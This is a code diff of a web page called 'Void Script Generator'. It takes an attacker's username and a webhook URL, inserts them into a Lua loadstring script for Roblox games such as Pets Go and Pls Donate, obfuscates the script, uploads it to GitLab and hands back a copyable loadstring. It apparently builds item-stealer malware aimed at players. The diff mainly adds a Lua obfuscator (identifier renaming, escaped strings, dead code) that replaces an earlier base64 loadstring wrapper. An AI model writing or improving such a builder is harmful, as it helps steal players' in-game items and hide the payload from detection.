@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Script Generator</title>
+    <title>Void Script Generator</title>
     <style>
         body {
             background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
@@ -48,54 +48,6 @@
             background: #ff0055;
             transform: scale(1.1);
         }
-        .toggle-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        .toggle-label {
-            font-size: 1rem;
-        }
-        .toggle-switch {
-            position: relative;
-            display: inline-block;
-            width: 50px;
-            height: 25px;
-        }
-        .toggle-switch input {
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-        .slider {
-            position: absolute;
-            cursor: pointer;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: #666;
-            transition: 0.4s;
-            border-radius: 25px;
-        }
-        .slider:before {
-            position: absolute;
-            content: "";
-            height: 17px;
-            width: 17px;
-            left: 4px;
-            bottom: 4px;
-            background-color: white;
-            transition: 0.4s;
-            border-radius: 50%;
-        }
-        input:checked + .slider {
-            background-color: #ff0080;
-        }
-        input:checked + .slider:before {
-            transform: translateX(24px);
-        }
         #copy-button {
             display: none;
             background: #00ff88;
@@ -104,7 +56,7 @@
 </head>
 <body>
 
-    <h1>Script Generator</h1>
+    <h1>Void Script Generator</h1>
     <div class="container">
         <input type="text" id="username" placeholder="Enter your Username">
         <input type="text" id="webhook" placeholder="Enter Webhook URL">
@@ -114,26 +66,58 @@
             <option value="Pls Donate">Pls Donate</option>
             <option value="Pets Go">Pets Go</option>
         </select>
-
-        <div class="toggle-container">
-            <label class="toggle-label">Auto Obfuscate</label>
-            <label class="toggle-switch">
-                <input type="checkbox" id="auto-obfuscate">
-                <span class="slider"></span>
-            </label>
-        </div>
-
+        <label>
+            <input type="checkbox" id="obfuscate-checkbox"> Obfuscate Script
+        </label>
         <button onclick="generateScript()">Generate Script</button>
         <button id="copy-button" onclick="copyLoadstring()">Copy Loadstring</button>
     </div>
 
     <script>
-        function toHex(str) {
-            return str.split('').map(c => c.charCodeAt(0).toString(16)).join('');
+        function generateRandomString(length) {
+            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let randomString = '';
+            for (let i = 0; i < length; i++) {
+                const rand = Math.floor(Math.random() * chars.length);
+                randomString += chars.charAt(rand);
+            }
+            return randomString;
         }
 
-        function obfuscateScript(script) {
-            return `loadstring(game:HttpGet(('data:text/plain;base64,'..syn.crypt.base64.encode('${toHex(script)}'))))()`;
+        function obfuscateLuaCode(code) {
+            let newCode = code;
+            const variableNames = {};
+
+            // Find all variable names
+            const varRegex = /\b\w+\b/g;
+            let match;
+            while ((match = varRegex.exec(code)) !== null) {
+                const varName = match[0];
+                if (!variableNames[varName]) {
+                    variableNames[varName] = generateRandomString(8);
+                }
+            }
+
+            // Replace variable names with obfuscated names
+            for (const [varName, obfuscated] of Object.entries(variableNames)) {
+                const varRegex = new RegExp(`\\b${varName}\\b`, 'g');
+                newCode = newCode.replace(varRegex, obfuscated);
+            }
+
+            // Obfuscate strings
+            newCode = newCode.replace(/"(.*?)"/g, (match, str) => {
+                return '"' + Array.from(str).map(c => '\\' + c.charCodeAt(0)).join('') + '"';
+            });
+
+            // Insert dead code
+            newCode = newCode.split('\n').map(line => {
+                if (Math.random() > 0.5) {
+                    line += `\nlocal ${generateRandomString(5)} = ${Math.random()}`;
+                }
+                return line;
+            }).join('\n');
+
+            return newCode;
         }
 
         async function uploadToGitLab(scriptContent) {
@@ -169,7 +153,7 @@
             let username = document.getElementById('username').value;
             let webhook = document.getElementById('webhook').value;
             let selectedScript = document.getElementById('script-select').value;
-            let autoObfuscate = document.getElementById('auto-obfuscate').checked;
+            let obfuscate = document.getElementById('obfuscate-checkbox').checked;
 
             if (!username || !webhook) {
                 alert("Please enter both Username and Webhook URL!");
@@ -185,8 +169,8 @@
 
             let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[selectedScript]}`;
 
-            if (autoObfuscate) {
-                script = obfuscateScript(script);
+            if (obfuscate) {
+                script = obfuscateLuaCode(script);
             }
 
             let uploadedUrl = await uploadToGitLab(script);
